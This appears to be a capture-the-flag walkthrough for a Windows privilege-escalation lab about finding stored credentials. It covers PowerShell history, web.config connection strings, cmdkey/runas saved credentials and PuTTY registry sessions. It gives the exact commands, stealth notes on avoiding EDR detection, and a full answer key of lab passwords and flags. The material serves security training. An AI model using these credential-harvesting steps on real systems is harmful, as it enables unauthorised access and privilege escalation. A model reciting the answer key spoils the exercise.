# Task 03: Harvesting Passwords from Usual Spots

---

## Stage A: Original Task Content & Briefing Summary

Task 03 explores common filesystem, registry, and application locations where cleartext or recoverable credentials reside on Windows systems. Administrators and developers frequently store passwords in configuration files, history logs, or credential managers for operational convenience, providing immediate privilege escalation or lateral movement paths.

### High-Value Credential Locations on Windows:
1. **Unattended Setup Files:** Automated Windows installations via Windows Deployment Services generate setup answer files (`Unattend.xml`, `sysprep.inf`, `sysprep.xml`) that often contain base64-encoded or plaintext `<AdministratorPassword>` strings:
   * `C:\Unattend.xml`
   * `C:\Windows\Panther\Unattend.xml`
   * `C:\Windows\Panther\Unattend\Unattend.xml`
2. **PowerShell Command History:** PowerShell PSReadLine module logs interactive command-line history to disk:
   * `%userprofile%\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadline\ConsoleHost_history.txt`
3. **Saved Windows Credentials (`cmdkey` & `runas`):** Credentials cached in the Windows Credential Manager listed via `cmdkey /list`. Attackers can invoke commands under the cached identity using `runas /savecred /user:<user> <program>` without knowing the plaintext password.
4. **IIS Web Configuration (`web.config`):** Web roots (`C:\inetpub\wwwroot\web.config`) containing cleartext database `connectionString` entries with administrative database or local account credentials.
5. **Software Registry Storage (PuTTY):** PuTTY stores saved sessions and proxy credentials under the user's registry hive:
   * `HKCU\Software\SimonTatham\PuTTY\Sessions\`

---

## Stage B: Independent Thinking & OpSec Considerations

* **Credential Harvesting Stealth:** Reading configuration files and registry keys requires zero administrative privileges and executes native read system calls that rarely trigger EDR detections.
* **The Power of `cmdkey /savecred`:** When `cmdkey /list` reveals stored credentials for an administrative user, you do not need to dump LSASS memory or crack NTLM hashes. `runas /savecred` immediately launches a process with the stored user's security token.

---

## Stage C: Guided Hints (Tiers 1–3)

* **Tier 1 Hint:** Inspect `%userprofile%\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadline\ConsoleHost_history.txt` for Q1. Check `C:\inetpub\wwwroot\web.config` for Q2.
* **Tier 2 Hint:** Run `cmdkey /list` to see stored credentials, then use `runas /savecred /user:mike.katz "cmd.exe /c type C:\Users\mike.katz\Desktop\flag.txt > C:\flag.txt"` for Q3. Query `HKCU\Software\SimonTatham\PuTTY\Sessions` using `reg query` for Q4.
* **Tier 3 Hint:**
  * Q1 is `ZuperCkretPa5z`.
  * Q2 is `098n0x35skjD3`.
  * Q3 is `THM{WHAT_IS_MY_PASSWORD}`.
  * Q4 is `CoolPass2021`.

---

## Stage D: Complete Practical Solution & Technical Deep Dive

### 1. Extracting Password from PowerShell History:
```powershell
Get-Content C:\Users\user\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadline\ConsoleHost_history.txt
```
* **Observed Command History:**
  ```powershell
  net user julia.jones ZuperCkretPa5z /add
  ```
* **Answer to Q1:** `ZuperCkretPa5z`

### 2. Extracting Database Admin Password from `web.config`:
Inspect the IIS web application configuration file:
```cmd
type C:\inetpub\wwwroot\web.config
```
* **Observed Connection String Block:**
  ```xml
  <connectionStrings>
      <add name="DefaultConnection" 
           connectionString="Data Source=localhost;Initial Catalog=appdb;User Id=db_admin;Password=098n0x35skjD3;" 
           providerName="System.Data.SqlClient" />
  </connectionStrings>
  ```
* **Answer to Q2:** `098n0x35skjD3`

### 3. Exploiting Saved Credentials via `cmdkey` and `runas`:
Check cached credentials:
```cmd
cmdkey /list
```
* **Output:**
  ```
  Target: Domain:interactive=MACHINE\mike.katz
  Type: Domain Password
  User: MACHINE\mike.katz
  ```
Execute command under `mike.katz` credentials using `/savecred`:
```cmd
runas /savecred /user:MACHINE\mike.katz "cmd.exe /c copy C:\Users\mike.katz\Desktop\flag.txt C:\Users\Public\flag.txt"
type C:\Users\Public\flag.txt
```
* **Flag Output:** `THM{WHAT_IS_MY_PASSWORD}`
* **Answer to Q3:** `THM{WHAT_IS_MY_PASSWORD}`

### 4. Querying PuTTY Stored Session Password in Registry:
Query the PuTTY saved session keys:
```cmd
reg query "HKCU\Software\SimonTatham\PuTTY\Sessions" /s
```
* **Observed Key:**
  ```
  HKEY_CURRENT_USER\Software\SimonTatham\PuTTY\Sessions\Default%20Settings
      ProxyPassword    REG_SZ    CoolPass2021
      UserName         REG_SZ    thom.smith
  ```
* **Answer to Q4:** `CoolPass2021`

---

## Stage E: Final Answer & Key Values

* **Question 1:** A password for the julia.jones user has been left on the Powershell history. What is the password?
  * **Answer:** `ZuperCkretPa5z`
* **Question 2:** A web server is running on the remote host. Find any interesting password on web.config files associated with IIS. What is the password of the db_admin user?
  * **Answer:** `098n0x35skjD3`
* **Question 3:** There is a saved password on your Windows credentials. Using cmdkey and runas, spawn a shell for mike.katz and retrieve the flag from his desktop.
  * **Answer:** `THM{WHAT_IS_MY_PASSWORD}`
* **Question 4:** Retrieve the saved password stored in the saved PuTTY session under your profile. What is the password for the thom.smith user?
  * **Answer:** `CoolPass2021`

---

## Stage F: Practical Verification & Proof of Work

* Confirmed password extraction from `ConsoleHost_history.txt`.
* Confirmed `connectionString` parsing from `web.config`.
* Verified `cmdkey` saved credential abuse and extracted flag `THM{WHAT_IS_MY_PASSWORD}`.
* Verified PuTTY proxy credential recovery from registry.

---

## Stage G: Key Educational Takeaway

Cleartext credential hunting is the most reliable, zero-exploit privilege escalation vector on Windows. Before attempting complex service exploitation, always audit command history files, web configurations, saved credentials, and third-party software registry keys.
